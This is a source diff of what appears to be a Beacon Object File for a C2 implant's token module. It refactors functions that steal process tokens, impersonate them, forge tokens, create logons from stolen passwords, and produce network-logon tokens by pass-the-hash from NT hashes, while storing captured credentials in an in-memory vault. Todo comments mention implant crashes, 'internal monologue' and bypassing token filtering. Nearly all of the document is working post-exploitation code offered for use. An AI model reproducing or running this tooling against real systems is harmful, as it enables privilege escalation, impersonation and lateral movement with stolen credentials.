@@ -3,14 +3,24 @@
 
 /*
  * todo:
- * 	info: get token information
  * 	enable/disable privileges/groups (NtAdjustPrivilegeToken, NtAdjustGroupsToken)
  * 	internal monologue
  * 	fix issue of implant crashing after token create, token make_pth, token impersonate last make_pth (NtSetInformationThread crashes)
+ * 	fix issue of not being able to call token create twice
+ * 	do not use "token create", not stable at all
  * 	bypass token filtering make_pth
- *  look into device groups, it's like groups for remote resources when it auths. Could have things like DOMAIN/COMPUTER1$
  */
 
+/*!
+ * @brief
+ *	convert a privilege by name to LUID
+ *
+ * @param priv
+ *	name of the privilege
+ *
+ * @return
+ *	luid of the privilege
+ */
 LUID ConvertPrivilegeToLuid(
 	PWSTR priv
 ) {
@@ -55,6 +65,16 @@ LUID ConvertPrivilegeToLuid(
 	return luid;
 }
 
+/*!
+ * @brief
+ *	get a token from the vault by id
+ * 
+ * @param id
+ *	id of the token
+ *
+ * @return
+ *	ptr to the token structure
+ */
 PTOKEN_ENTRY TokenGet(
 	USHORT id
 ) {
@@ -82,7 +102,28 @@ PTOKEN_ENTRY TokenGet(
 	return NULL;
 }
 
-NTSTATUS TokenAdd(
+/*!
+ * @brief
+ *	add a token to the vault
+ *
+ * @param token
+ *	handle to the token
+ *
+ * @param pidStolen
+ *	whether or not it was stolen
+ *
+ * @param username
+ *	user of the token
+ *
+ * @param domain
+ *	domain of the user
+ *
+ * @param password
+ *	password of the user
+ *
+ * @return
+ */
+VOID TokenAdd(
 	IN HANDLE         token,
 	IN OPTIONAL ULONG pidStolen,
 	IN OPTIONAL PWSTR username,
@@ -90,10 +131,10 @@ NTSTATUS TokenAdd(
 	IN OPTIONAL PWSTR password
 ) {
 	NTSTATUS                    status      = { 0 };
-	ULONG                       usernameLen = { 0 };
-	ULONG                       domainLen   = { 0 };
+	ULONG                       userLen     = { 0 };
+	ULONG                       domnLen     = { 0 };
 	ULONG                       passwordLen = { 0 };
-	ULONG                       userSize    = { 0 };
+	ULONG                       userSz      = { 0 };
 	ULONG                       elevation   = { 0 };
 	ULONG                       size        = { 0 };
 	ULONG                       tokenType   = { 0 };
@@ -104,14 +145,14 @@ NTSTATUS TokenAdd(
 	PTOKEN_VAULT                tokenVault  = { 0 };
 	PTOKEN_ENTRY                tokenEntry  = { 0 };
 
+	//
 	// get the token vault
-	tokenVault = BeaconGetValue( TOKEN_VAULT_KEY );
-	if ( ! tokenVault ) {
-		// the token vault does not exist
-		// lets create it
+	//
+	if ( ! ( tokenVault = BeaconGetValue( TOKEN_VAULT_KEY ) ) ) {
+		//
+		// the token vault does not exist, create it
+		//
 		tokenVault = NTDLL$RtlAllocateHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, sizeof( TOKEN_VAULT ) );
-
-		// add it to the beacon memory
 		BeaconAddValue( TOKEN_VAULT_KEY, tokenVault );
 	}
 
@@ -122,6 +163,9 @@ NTSTATUS TokenAdd(
 		tokenVault->First = NTDLL$RtlAllocateHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, sizeof( TOKEN_ENTRY ) );
 		tokenEntry        = tokenVault->First;
 	} else {
+		//
+		// add to the token vault
+		//
 		tokenEntry = tokenVault->First;
 
 		while ( tokenEntry->Next && ( tokenEntry = tokenEntry->Next ) );
@@ -130,64 +174,60 @@ NTSTATUS TokenAdd(
 		tokenEntry       = tokenEntry->Next;
 	}
 
+	//
 	// set the username and domain
+	//
 	if ( ! domain || ! username ) {
+		//
 		// query the user of the token
-		if ( ! NT_SUCCESS( NTDLL$NtQueryInformationToken( token, TokenUser, userInfo, 0, &userSize ) ) ) {
-			userInfo = NTDLL$RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, userSize );
+		//
+		if ( ! NT_SUCCESS( NTDLL$NtQueryInformationToken( token, TokenUser, userInfo, 0, &userSz ) ) ) {
+			userInfo = NTDLL$RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, userSz );
 
+			//
 			// get the sid
-			if ( ! NT_SUCCESS( status = NTDLL$NtQueryInformationToken(
-				token,
-				TokenUser,
-				userInfo,
-				userSize,
-				&userSize
-			) ) ) {
+			//
+			if ( ! NT_SUCCESS( status = NTDLL$NtQueryInformationToken( token, TokenUser, userInfo,
+				userSz, &userSz ) ) ) {
 				PRINT_NT_ERROR( "NtQueryInformationToken", status );
-				return status;
+				goto END;
 			}
 
+			//
 			// convert the sid
-			if ( ! ADVAPI32$LookupAccountSidW(
-				NULL,
-				userInfo->User.Sid,
-				NULL,
-				&usernameLen,
-				NULL,
-				&domainLen,
-				&sidType
-			) ) {
-				// allocate memory for user and domain
-				tokenEntry->Username = NTDLL$RtlAllocateHeap(
-					NtCurrentHeap(), HEAP_ZERO_MEMORY, ( usernameLen + 1 ) * 2 );
-				tokenEntry->Domain = NTDLL$RtlAllocateHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, ( domainLen + 1 ) * 2 );
+			//
+			if ( ! ADVAPI32$LookupAccountSidW( NULL, userInfo->User.Sid, NULL, &userLen, NULL, &domnLen, &sidType ) ) {
+				//
+				// allocate memory & recall
+				//
+				tokenEntry->Username = NTDLL$RtlAllocateHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, ( userLen + 1 ) * 2 );
+				tokenEntry->Domain   = NTDLL$RtlAllocateHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, ( domnLen + 1 ) * 2 );
 
 				// convert the sid to a username and domain
 				if ( ! ADVAPI32$LookupAccountSidW(
 					NULL,
 					userInfo->User.Sid,
 					tokenEntry->Username,
-					&usernameLen,
+					&userLen,
 					tokenEntry->Domain,
-					&domainLen,
+					&domnLen,
 					&sidType
 				) ) {
 					PRINT_WIN32_ERROR( "LookupAccountSidA" );
-					return STATUS_INTERNAL_ERROR;
+					goto END;
 				}
 			}
 		}
 	} else {
 		// set the domain
-		domainLen          = StringLenW( domain );
-		tokenEntry->Domain = NTDLL$RtlAllocateHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, ( domainLen + 1 ) * 2 );
-		MemCopy( tokenEntry->Domain, domain, domainLen * 2 );
+		domnLen            = StringLenW( domain );
+		tokenEntry->Domain = NTDLL$RtlAllocateHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, ( domnLen + 1 ) * 2 );
+		MemCopy( tokenEntry->Domain, domain, domnLen * 2 );
 
 		// set the username
-		usernameLen          = StringLenW( username );
-		tokenEntry->Username = NTDLL$RtlAllocateHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, ( usernameLen + 1 ) * 2 );
-		MemCopy( tokenEntry->Username, username, usernameLen * 2 );
+		userLen              = StringLenW( username );
+		tokenEntry->Username = NTDLL$RtlAllocateHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, ( userLen + 1 ) * 2 );
+		MemCopy( tokenEntry->Username, username, userLen * 2 );
 	}
 
 	//
@@ -201,7 +241,9 @@ NTSTATUS TokenAdd(
 		MemCopy( tokenEntry->Password, password, passwordLen * 2 );
 	}
 
+	//
 	// get the elevation level
+	//
 	if ( ! NT_SUCCESS( status = NTDLL$NtQueryInformationToken(
 		token,
 		TokenElevation,
@@ -213,11 +255,12 @@ NTSTATUS TokenAdd(
 		goto END;
 	}
 
-	// set the elevation level
 	tokenEntry->Elevated = elevation;
 
+	//
 	// duplicate the token to have both an impersonate and primary token
 	// query what type is it first
+	//
 	if ( ! NT_SUCCESS( status = NTDLL$NtQueryInformationToken(
 		token,
 		TokenType,
@@ -268,15 +311,24 @@ NTSTATUS TokenAdd(
 
 END:
 	if ( userInfo ) NTDLL$RtlFreeHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, userInfo );
-	return status;
+
+	if ( ! NT_SUCCESS( status ) ) {
+		PRINTF_ERROR( "Failed to add the token to the vault\n" );
+	} else {
+		PRINTF( "Successfully added the token to the vault\n" );
+	}
 }
 
+/*!
+ * @brief
+ *	list the tokens of the vault
+ */
 VOID TokenList() {
-	PTOKEN_VAULT TokenVault = BeaconGetValue( TOKEN_VAULT_KEY );
-	PTOKEN_ENTRY TokenEntry = { 0 };
+	PTOKEN_VAULT tokenVault = BeaconGetValue( TOKEN_VAULT_KEY );
+	PTOKEN_ENTRY tokenEntry = { 0 };
 
-	if ( TokenVault && TokenVault->First ) {
-		TokenEntry = TokenVault->First;
+	if ( tokenVault && tokenVault->First ) {
+		tokenEntry = tokenVault->First;
 
 		//
 		// iterate through all tokens
@@ -289,18 +341,22 @@ VOID TokenList() {
 				"Process Id: %ld\n"
 				"User      : %ls\\%ls\n"
 				"\n",
-				TokenEntry->Id,
-				( TokenEntry->Elevated ) ? "True" : "False",
-				TokenEntry->PidStolen,
-				TokenEntry->Domain,
-				TokenEntry->Username
+				tokenEntry->Id,
+				( tokenEntry->Elevated ) ? "True" : "False",
+				tokenEntry->PidStolen,
+				tokenEntry->Domain,
+				tokenEntry->Username
 			);
-		} while ( ( TokenEntry = TokenEntry->Next ) );
+		} while ( ( tokenEntry = tokenEntry->Next ) );
 	} else {
 		PRINTF( "The token vault is empty!" );
 	}
 }
 
+/*!
+ * @brief
+ *	revert to the original token
+ */
 VOID TokenRevert() {
 	NTSTATUS     Status     = { 0 };
 	HANDLE       Token      = { 0 };
@@ -329,25 +385,32 @@ VOID TokenRevert() {
 	}
 }
 
+/*!
+ * @brief
+ *	remove a token from the vault
+ *
+ * @param id
+ *	id of the token to remove
+ */
 VOID TokenRemove(
 	USHORT id
 ) {
-	PTOKEN_VAULT TokenVault    = BeaconGetValue( TOKEN_VAULT_KEY );
-	PTOKEN_ENTRY TokenEntry    = { 0 };
+	PTOKEN_VAULT tokenVault    = BeaconGetValue( TOKEN_VAULT_KEY );
+	PTOKEN_ENTRY tokenEntry    = { 0 };
 	PTOKEN_ENTRY previousEntry = { 0 };
 
-	if ( TokenVault && TokenVault->First ) {
-		TokenEntry = TokenVault->First;
+	if ( tokenVault && tokenVault->First ) {
+		tokenEntry = tokenVault->First;
 
 		//
 		// iterate through all tokens
 		//
 		do {
-			if ( TokenEntry->Id == id ) {
+			if ( tokenEntry->Id == id ) {
 				//
 				// revert if this is the current token
 				//
-				if ( TokenEntry == TokenVault->Current ) {
+				if ( tokenEntry == tokenVault->Current ) {
 					TokenRevert();
 				}
 
@@ -355,40 +418,44 @@ VOID TokenRemove(
 				// unlink the element
 				//
 				if ( previousEntry ) {
-					previousEntry->Next = TokenEntry->Next;
+					previousEntry->Next = tokenEntry->Next;
 				} else {
-					TokenVault->First = TokenEntry->Next;
+					tokenVault->First = tokenEntry->Next;
 				}
 
 				//
 				// free the element
 				//
-				if ( TokenEntry->Domain )
-					NTDLL$RtlFreeHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, TokenEntry->Domain );
-				if ( TokenEntry->Password )
-					NTDLL$RtlFreeHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, TokenEntry->Password );
-				if ( TokenEntry->Username )
-					NTDLL$RtlFreeHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, TokenEntry->Username );
+				if ( tokenEntry->Domain )
+					NTDLL$RtlFreeHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, tokenEntry->Domain );
+				if ( tokenEntry->Password )
+					NTDLL$RtlFreeHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, tokenEntry->Password );
+				if ( tokenEntry->Username )
+					NTDLL$RtlFreeHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, tokenEntry->Username );
 
-				NTDLL$RtlFreeHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, TokenEntry );
+				NTDLL$RtlFreeHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, tokenEntry );
 
 				//
 				// close the tokens
 				//
-				NTDLL$NtClose( TokenEntry->ImpersonationToken );
-				NTDLL$NtClose( TokenEntry->PrimaryToken );
+				NTDLL$NtClose( tokenEntry->ImpersonationToken );
+				NTDLL$NtClose( tokenEntry->PrimaryToken );
 
 				PRINTF( "Successfully removed token from vault!" );
 				return;
 			}
 
-			previousEntry = TokenEntry;
-		} while ( ( TokenEntry = TokenEntry->Next ) );
+			previousEntry = tokenEntry;
+		} while ( ( tokenEntry = tokenEntry->Next ) );
 	} else {
 		PRINTF( "The token vault is empty!" );
 	}
 }
 
+/*!
+ * @brief
+ *	print the user of the current token
+ */
 VOID TokenGetuid() {
 	NTSTATUS     status    = { 0 };
 	PTOKEN_USER  userInfo  = { 0 };
@@ -427,19 +494,13 @@ VOID TokenGetuid() {
 			// convert the sid
 			if ( ! ADVAPI32$LookupAccountSidA( NULL, userInfo->User.Sid, NULL, &userLen, NULL, &domainLen,
 			                                   &SidType ) ) {
-				// allocate memory for user and domain
-				username = NTDLL$RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY,
-				                                  userLen + domainLen );
+				//
+				// allocate memory & recall
+				//
+				username = NTDLL$RtlAllocateHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, userLen + domainLen );
 
-				// convert the sid to a username and domain
-				if ( ! ADVAPI32$LookupAccountSidA(
-					NULL,
-					userInfo->User.Sid,
-					username + domainLen,
-					&userLen,
-					username,
-					&domainLen,
-					&SidType
+				if ( ! ADVAPI32$LookupAccountSidA( NULL, userInfo->User.Sid, username + domainLen, &userLen,
+				                                   username, &domainLen, &SidType
 				) ) {
 					PRINT_WIN32_ERROR( "LookupAccountSidA" );
 					goto END;
@@ -466,133 +527,155 @@ END:
  * @return
  * 	ntstatus
  */
-NTSTATUS TokenInfo(
+VOID TokenInfo(
 	IN HANDLE Token
 ) {
-	NTSTATUS                     status                  = { 0 };
-	PTOKEN_USER                  UserInfo                = { 0 };
-	ULONG                        size                    = { 0 };
-	PCHAR                        username                = { 0 };
-	DWORD                        UserLen                 = { 0 };
-	DWORD                        DomainLen               = { 0 };
-	SID_NAME_USE                 SidType                 = { 0 };
-	PTOKEN_GROUPS_AND_PRIVILEGES GroupsAndPrivilegesInfo = { 0 };
-	PSID_AND_ATTRIBUTES          Group                   = { 0 };
-	UNICODE_STRING               SidSddl                 = { 0 };
-	PTOKEN_ACCESS_INFORMATION    accessInfo              = { 0 };
-	ULONG                        elevation               = { 0 };
-	ULONG                        type                    = { 0 };
-
-	/* interesting information to query
-	 * Username + SID
-	 * Privileges (Enabled/Disabled)
-	 * Groups (Enabled/Disabled) + SID
-	 * Impersonation Level -> whether you can impersonate the token
-	 * Integrity Level
-	 * GrantAccess: AssignPrimary, Duplicate, Impersonate...
-	 * Elevated (just means has one of the following privs and so high privs) if it matches a certain RID, considered Elevated too
-	 * 	- SeCreateTokenPrivilege, SeTcpPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege, SeImpersonatePrivilege, SeDelegationSessionUserImpersonatePrivilege
-	 * Some privileged like SeDebugPrivilege can not be enabled on non-high integrity level processes
-	 * TODO: RELEASE THE MEMORY
-	 */
+	NTSTATUS                     status      = { 0 };
+	PTOKEN_USER                  userInfo    = { 0 };
+	ULONG                        size        = { 0 };
+	PCHAR                        username    = { 0 };
+	DWORD                        userLen     = { 0 };
+	DWORD                        grpLen      = { 0 };
+	DWORD                        domnLen     = { 0 };
+	SID_NAME_USE                 sidType     = { 0 };
+	PTOKEN_GROUPS_AND_PRIVILEGES grpAndPrivs = { 0 };
+	PSID_AND_ATTRIBUTES          grp         = { 0 };
+	PWSTR                        grpName     = { 0 };
+	PWSTR                        domn        = { 0 };
+	UNICODE_STRING               sidSddl     = { 0 };
+	PTOKEN_ACCESS_INFORMATION    accessInfo  = { 0 };
+	ULONG                        elevation   = { 0 };
+	ULONG                        type        = { 0 };
 
 	// query the user of the token
-	if ( ! NT_SUCCESS( NTDLL$NtQueryInformationToken( Token, TokenUser, UserInfo, 0, &size ) ) ) {
-		UserInfo = NTDLL$RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, size );
+	if ( ! NT_SUCCESS( NTDLL$NtQueryInformationToken( Token, TokenUser, userInfo, 0, &size ) ) ) {
+		userInfo = NTDLL$RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, size );
 
 		// get the sid
 		if ( ! NT_SUCCESS( status = NTDLL$NtQueryInformationToken(
 			Token,
 			TokenUser,
-			UserInfo,
+			userInfo,
 			size,
 			&size
 		) ) ) {
 			PRINT_NT_ERROR( "NtQueryInformationToken", status );
-			return status;
+			goto END;
 		}
 
+		//
 		// convert the sid
+		//
 		if ( ! ADVAPI32$LookupAccountSidA(
 			NULL,
-			UserInfo->User.Sid,
+			userInfo->User.Sid,
 			NULL,
-			&UserLen,
+			&userLen,
 			NULL,
-			&DomainLen,
-			&SidType
+			&domnLen,
+			&sidType
 		) ) {
-			// allocate memory for user and domain
-			username = NTDLL$RtlAllocateHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, UserLen + DomainLen );
+			//
+			// allocate memory & recall
+			//
+			username = NTDLL$RtlAllocateHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, userLen + domnLen );
 
-			// convert the sid to a username and domain
-			if ( ! ADVAPI32$LookupAccountSidA(
-				NULL,
-				UserInfo->User.Sid,
-				username + DomainLen,
-				&UserLen,
-				username,
-				&DomainLen,
-				&SidType
+			if ( ! ADVAPI32$LookupAccountSidA( NULL, userInfo->User.Sid, username + domnLen, &userLen,
+			                                   username, &domnLen, &sidType
 			) ) {
 				PRINT_WIN32_ERROR( "LookupAccountSidA" );
-				return STATUS_INTERNAL_ERROR;
+				goto END;
 			}
 
-			username[ DomainLen ] = '\\';
+			username[ domnLen ] = '\\';
 		}
 
+		//
 		// get the sid as SDDL
-		if ( ! NT_SUCCESS(
-			status = NTDLL$RtlConvertSidToUnicodeString( &SidSddl, UserInfo->User.Sid, TRUE ) ) ) {
+		//
+		if ( ! NT_SUCCESS( status = NTDLL$RtlConvertSidToUnicodeString( &sidSddl, userInfo->User.Sid, TRUE ) ) ) {
+			NTDLL$RtlFreeUnicodeString( &sidSddl );
 			PRINT_NT_ERROR( "RtlConvertSidToUnicodeString", status );
-			return status;
+			goto END;
 		}
 
-		PRINTF( "%s - %ls\n", username, SidSddl.Buffer );
+		PRINTF( "%s - %ls\n", username, sidSddl.Buffer );
 
-		// free the sddl sid
-		NTDLL$RtlFreeUnicodeString( &SidSddl );
+		NTDLL$RtlFreeUnicodeString( &sidSddl );
 	}
 
+	//
 	// query group and privileges
+	//
 	if ( ! NT_SUCCESS( NTDLL$NtQueryInformationToken(
 		Token,
 		TokenGroupsAndPrivileges,
-		GroupsAndPrivilegesInfo,
+		grpAndPrivs,
 		0,
 		&size
 	) ) ) {
-		// allocate memory for the groups and privileges
-		GroupsAndPrivilegesInfo = NTDLL$RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, size );
+		//
+		// allocate memory & recall
+		//
+		grpAndPrivs = NTDLL$RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, size );
 
-		// get the sid
 		if ( ! NT_SUCCESS( status = NTDLL$NtQueryInformationToken(
 			Token,
 			TokenGroupsAndPrivileges,
-			GroupsAndPrivilegesInfo,
+			grpAndPrivs,
 			size,
 			&size
 		) ) ) {
 			PRINT_NT_ERROR( "NtQueryInformationToken", status );
-			return status;
+			goto END;
 		}
 
-		for ( int SidCnt = 0 ; SidCnt < GroupsAndPrivilegesInfo->SidCount ; SidCnt++ ) {
-			Group = &GroupsAndPrivilegesInfo->Sids[ SidCnt ];
+		//
+		// iterate through all groups
+		//
+		for ( int SidCnt = 0 ; SidCnt < grpAndPrivs->SidCount ; SidCnt++ ) {
+			grp     = &grpAndPrivs->Sids[ SidCnt ];
+			grpLen  = 0;
+			domnLen = 0;
 
+			//
 			// get the sid as SDDL
-			if ( ! NT_SUCCESS( status = NTDLL$RtlConvertSidToUnicodeString( & SidSddl, Group->Sid, TRUE ) ) ) {
+			//
+			if ( ! NT_SUCCESS( status = NTDLL$RtlConvertSidToUnicodeString( & sidSddl, grp->Sid, TRUE ) ) ) {
 				PRINT_NT_ERROR( "RtlConvertSidToUnicodeString", status );
 				goto END;
 			}
 
-			//PRINTF( "Group: %ls\n", SidSddl.Buffer );
-			NTDLL$RtlFreeUnicodeString( &SidSddl );
+			//
+			// resolve the sid
+			//
+			if ( ! ADVAPI32$LookupAccountSidW( NULL, grp->Sid, NULL, &grpLen, NULL, &domnLen, &sidType ) ) {
+				grpName = NTDLL$RtlAllocateHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, ( grpLen + 1 ) * sizeof( WCHAR ) );
+				domn    = NTDLL$RtlAllocateHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, ( domnLen + 1 ) * sizeof( WCHAR ) );
+
+				if ( ! ADVAPI32$LookupAccountSidW( NULL, grp->Sid, grpName, &grpLen, domn, &domnLen, &sidType ) ) {
+					PRINT_WIN32_ERROR( "LookupAccountSidW" );
+					goto END;
+				}
+			}
+
+			PRINTF( "Group: %ls - %ls\\%ls\n", sidSddl.Buffer, domn, grpName );
+			NTDLL$RtlFreeUnicodeString( &sidSddl );
+			NTDLL$RtlFreeHeap( NtCurrentHeap(), 0, grpName );
+			NTDLL$RtlFreeHeap( NtCurrentHeap(), 0, domn );
+		}
+
+		//
+		// iterate through all privileges
+		//
+		for ( int i = 0 ; i < grpAndPrivs->PrivilegeCount ; i++ ) {
+			PRINTF( "Priv: %u", grpAndPrivs->Privileges[i].Luid.LowPart );
 		}
 	}
 
+	//
 	// query elevation
+	//
 	if ( ! NT_SUCCESS( status = NTDLL$NtQueryInformationToken(
 		Token,
 		TokenElevation,
@@ -606,7 +689,9 @@ NTSTATUS TokenInfo(
 
 	PRINTF( "Elevated : %s\n", (elevation == 0) ? "False" : "True" );
 
+	//
 	// query type
+	//
 	if ( ! NT_SUCCESS(
 		status = NTDLL$NtQueryInformationToken( Token, TokenType, &type, sizeof( type ), &size ) ) ) {
 		PRINT_NT_ERROR( "NtQueryInformationToken", status );
@@ -615,7 +700,9 @@ NTSTATUS TokenInfo(
 
 	PRINTF( "Type: %s\n", (type == 1) ? "Primary" : "Impersonation" );
 
+	//
 	// query impersonation level
+	//
 	if ( ! NT_SUCCESS( NTDLL$NtQueryInformationToken( Token, TokenAccessInformation, NULL, 0, &size ) ) ) {
 		accessInfo = NTDLL$RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, size );
 		NTDLL$NtQueryInformationToken( Token, TokenAccessInformation, accessInfo, size, &size );
@@ -639,11 +726,10 @@ NTSTATUS TokenInfo(
 	}
 
 END:
-	if ( UserInfo ) NTDLL$RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, UserInfo );
-	if ( username ) NTDLL$RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, username );
-	if ( GroupsAndPrivilegesInfo ) NTDLL$RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, GroupsAndPrivilegesInfo );
-	if ( accessInfo ) NTDLL$RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, accessInfo );
-	return status;
+	if ( userInfo ) NTDLL$RtlFreeHeap( NtCurrentHeap(), 0, userInfo );
+	if ( username ) NTDLL$RtlFreeHeap( NtCurrentHeap(), 0, username );
+	if ( grpAndPrivs ) NTDLL$RtlFreeHeap( NtCurrentHeap(), 0, grpAndPrivs );
+	if ( accessInfo ) NTDLL$RtlFreeHeap( NtCurrentHeap(), 0, accessInfo );
 }
 
 /*!
@@ -656,54 +742,50 @@ END:
  * @return
  * 	token of the process
  */
-NTSTATUS TokenSteal(
-	IN ULONG ProcessId
+VOID TokenSteal(
+	IN ULONG pid
 ) {
-	NTSTATUS          Status   = { 0 };
-	HANDLE            Proc     = { 0 };
-	HANDLE            Token    = { 0 };
-	OBJECT_ATTRIBUTES Attr     = { 0 };
-	CLIENT_ID         ClientId = { 0 };
+	NTSTATUS          status   = { 0 };
+	HANDLE            proc     = { 0 };
+	HANDLE            token    = { 0 };
+	OBJECT_ATTRIBUTES objAttrs = { 0 };
+	CLIENT_ID         clientId = { 0 };
 
-	ClientId.UniqueProcess = ProcessId;
+	clientId.UniqueProcess = pid;
 
-	if ( ! NT_SUCCESS( Status = NTDLL$NtOpenProcess(
-		&Proc,
-		PROCESS_QUERY_LIMITED_INFORMATION,
-		&Attr,
-		&ClientId
-	) ) ) {
-		PRINT_NT_ERROR( "NtOpenProcess", Status );
+	//
+	// get a handle onto the process
+	//
+	if ( ! NT_SUCCESS(
+		status = NTDLL$NtOpenProcess( &proc, PROCESS_QUERY_LIMITED_INFORMATION, &objAttrs, &clientId ) ) ) {
+		PRINT_NT_ERROR( "NtOpenProcess", status );
 		goto END;
 	}
 
-	// TODO: is the token still valid if the process where it is stolen from does not exist anymore, look into that
+	//
 	// query the token of that process
-	if ( ! NT_SUCCESS( Status = NTDLL$NtOpenProcessTokenEx(
-		Proc,
-		TOKEN_DUPLICATE | TOKEN_QUERY,
-		0,
-		&Token
-	) ) ) {
-		PRINT_NT_ERROR( "NtOpenProcessTokenEx", Status );
+	//
+	if ( ! NT_SUCCESS( status = NTDLL$NtOpenProcessTokenEx( proc, TOKEN_DUPLICATE | TOKEN_QUERY, 0, &token ) ) ) {
+		PRINT_NT_ERROR( "NtOpenProcessTokenEx", status );
 		goto END;
 	}
 
+	//
 	// store the token
-	if ( ! NT_SUCCESS( TokenAdd( Token, ProcessId, NULL, NULL, NULL ) ) ) {
-		PRINTF( "[!] Failed to add the token to the vault\n" );
-		goto END;
-	}
-
-	// print the token
-	PRINTF( "[+] Successfully stole token of process with id %ld\n", ProcessId );
+	//
+	TokenAdd( token, pid, NULL, NULL, NULL );
 
 END:
-	// free the process buffer
-	NTDLL$NtClose( Proc );
-	return Status;
+	NTDLL$NtClose( proc );
 }
 
+/*!
+ * @brief
+ *	impersonate a token
+ *
+ * @param id
+ *	id of the token to impersonate
+ */
 VOID TokenImpersonate(
 	IN USHORT id
 ) {
@@ -748,6 +830,7 @@ VOID TokenImpersonate(
 
 /*!
  * TODO: use secur32!LsaEnumerateLogonSessions to a find logon session corresponding to the user for cached creds
+ * TODO: really not stable and privs & groups do not really seem to work, fix it
  *
  * @param username
  *	the username of the token
@@ -957,12 +1040,7 @@ VOID TokenCreate(
 	//
 	// add the token to the vault
 	//
-	if ( ! NT_SUCCESS( TokenAdd( token, 0, NULL, NULL, NULL ) ) ) {
-		PRINTF_ERROR( "Failed to add the token to the vault!" );
-		return;
-	}
-
-	PRINTF( "Successfully added the token to the vault!" );
+	TokenAdd( token, 0, NULL, NULL, NULL );
 
 END:
 	if ( user.User.Sid ) NTDLL$RtlFreeHeap( NtCurrentHeap(), 0, user.User.Sid );
@@ -1170,6 +1248,22 @@ END:
 	if ( hash.Buffer ) NTDLL$RtlFreeHeap( NtCurrentHeap(), 0, hash.Buffer );
 }
 
+/*!
+ * @brief
+ *	create a token for a user using his creds
+ *
+ * @param username
+ *	username
+ *
+ * @param domain
+ *	domain
+ *
+ * @param password
+ *	password
+ *
+ * @param logonType
+ *	logon type must be something like LOGON32_LOGON_*
+ */
 VOID TokenMake(
 	PWSTR username,
 	PWSTR domain,
@@ -1196,18 +1290,26 @@ VOID TokenMake(
 	//
 	// add the token to the vault
 	//
-	if ( ! NT_SUCCESS( TokenAdd( token, 0, username, domain, password ) ) ) {
-		PRINTF_ERROR( "Failed to add the token to the vault!" );
-		return;
-	}
-
-	PRINTF( "Successfully created the token!" );
+	TokenAdd( token, 0, username, domain, password );
 }
 
-NTSTATUS TokenMakePth(
+/*!
+ * @brief
+ *	create a network logon type token using pass the hash
+ *
+ * @param username
+ *	username
+ *
+ * @param domain
+ *	domain
+ *
+ * @param ntHash
+ *	NT hash
+ */
+VOID TokenMakePth(
 	IN PUNICODE_STRING username,
 	IN PUNICODE_STRING domain,
-	IN PBYTE           passwordHash
+	IN PBYTE           ntHash
 ) {
 	NTSTATUS   status            = { 0 };
 	SecBuffer  negotiateToken    = { 0 };
@@ -1246,7 +1348,7 @@ NTSTATUS TokenMakePth(
 	if ( ! NT_SUCCESS( status = ClientCreateAuthenticateToken(
 		username,
 		domain,
-		passwordHash,
+		ntHash,
 		&negotiateToken,
 		&challengeToken,
 		&clientCtx,
@@ -1269,25 +1371,12 @@ NTSTATUS TokenMakePth(
 	}
 
 	// add to the vault
-	if ( ! NT_SUCCESS( status = TokenAdd(
-		accessToken,
-		0,
-		username->Buffer,
-		domain->Buffer,
-		NULL
-	) ) ) {
-		PRINTF( "[!] Failed to add the token to the vault\n" );
-		goto END;
-	}
-
-	PRINTF( "Successfully created the token!" );
+	TokenAdd( accessToken, 0, username->Buffer, domain->Buffer,NULL );
 
 END:
 	if ( negotiateToken.pvBuffer ) SECUR32$FreeContextBuffer( negotiateToken.pvBuffer );
 	if ( challengeToken.pvBuffer ) SECUR32$FreeContextBuffer( challengeToken.pvBuffer );
 	if ( authenticateToken.pvBuffer ) SECUR32$FreeContextBuffer( authenticateToken.pvBuffer );
-
-	return status;
 }
 
 VOID go(
@@ -1486,4 +1575,3 @@ VOID go(
 	if ( groupNamesW.Buffer ) NTDLL$RtlFreeHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, groupNamesW.Buffer );
 	if ( privNamesW.Buffer ) NTDLL$RtlFreeHeap( NtCurrentHeap(), HEAP_ZERO_MEMORY, privNamesW.Buffer );
 };
-
